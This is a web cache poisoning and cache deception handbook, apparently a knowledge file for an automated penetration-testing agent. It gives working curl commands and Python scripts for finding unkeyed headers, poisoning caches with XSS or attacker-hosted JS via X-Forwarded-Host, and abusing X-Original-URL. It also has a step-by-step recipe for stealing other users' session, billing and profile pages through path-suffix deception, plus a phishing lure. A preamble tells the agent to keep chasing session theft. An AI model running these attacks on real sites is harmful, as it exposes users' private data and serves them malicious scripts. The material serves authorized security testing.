> Structure: the upper half is the original mainline (unkeyed / deception); the lower half is a supplement plus end-of-file appendices for deeper coverage. Confirm the cache key before attempting poisoning. The shortlist entry "cache deception to steal session pages" lives under the original "Section 4, Web Cache Deception" — search by that heading.
>
> Whether to write up is governed solely by `../rules/report-format.md`. If you only confirm the cache key but found no poisoning / session theft → keep chasing poisoning / session theft. If there is an authenticated personal page / billing page / `/api/me`, you can already try appending extensions — no need to see `X-Cache` first. If no such page exists, do not add a bare `.css` just to tick the shortlist.

## 1. Original Knowledge Base

# Cache Poisoning Testing Handbook

## 1. Web Cache Poisoning Principles

### Core Concepts

```
Cache Key: the unique identifier that determines a cache entry
  Typically includes: Host, Path, Query String

Unkeyed input: input that is not part of the cache key but still affects the response content
  e.g., X-Forwarded-Host, User-Agent, Cookie

Attack principle:
1. Find an unkeyed input
2. Craft a malicious request so the response contains malicious content
3. The response gets cached
4. Other users request the same URL and receive the poisoned cache entry
```
...
### 2.1 Identifying Cache Behavior

```bash
# Send the same request twice and observe the response headers
...
# Age: 123 (time the entry has been cached)
# Cache-Control: max-age=3600
```

### 2.2 Testing Unkeyed Inputs

```python
import requests

def test_unkeyed_inputs(url):
    """Test which inputs are not part of the cache key"""
    ...
    for header in headers_to_test:
        # Send a request with a unique value
        unique_value = f"test-{header}-123"
        r1 = requests.get(url, headers={header: unique_value})
        
        # Request again (without that header)
        r2 = requests.get(url)
        
        # If the r2 response contains unique_value → that header is unkeyed
        if unique_value in r2.text:
            print(f"[!] Unkeyed input found: {header}")
            print(f"    Response contains: {unique_value}")
```
...
```bash
# Attack: alter the resource loading path
...
# Result: the cache is poisoned and all users load the attacker's JS
```
...
# Links in the response may become:
<link href="http://target.com/style.css">

# Result: man-in-the-middle attack risk
```

### 3.3 X-Original-URL / X-Rewrite-URL

```bash
# Attack: cache an error page under a normal URL
curl "https://target.com/normal-page" \
  -H "X-Original-URL: /admin/secret"

# If the backend routes via X-Original-URL but the cache uses the original URL
# Result: /normal-page is cached with the content of /admin/secret
```

### 3.4 UTM Parameters

```bash
# Marketing parameters are usually not part of the cache key
curl "https://target.com/?utm_source=<script>alert(1)</script>"

# If the response reflects that parameter:
<div>Source: <script>alert(1)</script></div>

# Result: the XSS is cached
```
...
### Cache Deception to Steal Session Pages (Shortlist Pointer)

Confirm: an authenticated personal page, billing page, `/api/me`, or settings page. `X-Cache` / `Age` / `Via` make it easier to confirm but are **not a prerequisite**.

Attack:

1. While unauthenticated, request the original path first and record the baseline (should be 401 / login page / empty).
2. **While authenticated**, open the same page, then request `original-path/x.css`, `original-path;.css`, `original-path%2f.css`.
3. Check whether `X-Cache: HIT` / `Age` goes up. Then request the same suffixed URL **unauthenticated**.

Counts as success: while unauthenticated you obtain **another user's** personal page / billing / session page body (name, phone, cookie page). A mere CSS shell HIT does not count.

False positives: `Cache-Control: no-store`; the application 404s the suffixed path; the cache only stores after the victim clicks, and you never obtain other users' data. A single-site miss does not remove this shortlist row. If a session page exists you can attack — no need to see cache headers first. If there is no personal/billing page, do not add a suffix just to tick the shortlist.

Poisoning (using an unkeyed header to replace another user's page with your JS) is a separate track — details are in the lower-half supplement and the appendix.

### 4.1 Path Confusion

```bash
# Principle: the cache and the application normalize paths differently

# Attack 1: static asset extension
curl "https://target.com/profile/victim.css"

# Cache: treats it as a CSS file and caches it
# Application: ignores .css and returns the content of /profile/victim
# Result: the victim's personal data is cached as a public CSS file

# Attack 2: path parameter
...
### 4.2 Tricking the Victim Into Visiting

```html
<!-- The attacker sends a phishing email -->
<img src="https://target.com/profile/victim.css">

<!-- After the victim clicks, their personal data is cached -->
<!-- The attacker visits the same URL and retrieves the cached sensitive data -->
```
...
### 5.1 Encoding Differences

```bash
# The cache and the application handle URL encoding differently
...
# If the cache treats these as different but the application treats them as the same
# you can bypass the cache and reach the application directly
```
...
# Different normalization can lead to cache bypass or poisoning
```

---

## 6. CDN-Specific Techniques

### 6.1 Cloudflare

```bash
# Cloudflare cache key: Host + Path + Query String (sorted)
...
```bash
# Akamai cache key: configurable, usually includes Host + Path

# Unkeyed inputs:
# - True-Client-IP
# - X-Forwarded-For
# - Pragma: akamai-x-cache-on (debug header)
...
```bash
# Fastly cache key: Host + Path + Query String
...
### 7.1 Param Miner (Burp Extension)

```
Features:
- Automatically detect unkeyed inputs
...
def test_cache_poisoning(url, header, value):
    ...
    print(f"[*] Sending poisoning request: {header}: {poison_value}")
    print(f"    Response status: {r1.status_code}")
    print(f"    Cache status: {r1.headers.get('X-Cache', 'Unknown')}")
    
    # Wait for the cache to take effect
    import time
    time.sleep(2)
    
    # Send a normal request (without the malicious header)
    r2 = requests.get(url)
    
    print(f"[*] Sending normal request")
    print(f"    Response status: {r2.status_code}")
    print(f"    Cache status: {r2.headers.get('X-Cache', 'Unknown')}")
    
    # Check whether the cache was poisoned
    if unique_id in r2.text:
        print(f"[!] Cache poisoning succeeded!")
        print(f"    Response contains: {unique_id}")
        return True
    else:
        print(f"[-] Cache poisoning failed")
        return False
...
### 7.3 Cache Key Detection

```python
def detect_cache_key(url):
    """Probe the cache key composition"""
    ...
    for component, value in components.items():
        # Send two requests; modify that component in the second one
        r1 = requests.get(url)
        ...
        # If the second request is MISS, that component is in the cache key
...
### 8.1 XSS Cache Poisoning

```bash
# Find a reflected XSS point
curl "https://target.com/search?q=<script>alert(1)</script>"

# If that page gets cached, every user triggers XSS on visit
```

### 8.2 Phishing Page Caching

```bash
# Poison the homepage to display phishing content
curl "https://target.com/" \
  -H "X-Forwarded-Host: attacker.com"

# The response loads the attacker's JS and shows a fake login box
```

### 8.3 Sensitive Information Disclosure

```bash
# Cache deception: cache personal data as a public resource
curl "https://target.com/profile/victim.css"

# The attacker visits the same URL and obtains the victim's data
```
...
# 1. Strict cache key
# Signature: every input affecting the response is in the cache key

# 2. Input validation
# Signature: rejects abnormal X-Forwarded-* headers

# 3. Cache isolation
# Signature: sensitive pages are not cached (Cache-Control: no-store)

# 4. Response header inspection
# Signature: unkeyed inputs are not reflected in the response
```
...
## Appendix: CACHE_POISONING_TECHNIQUES
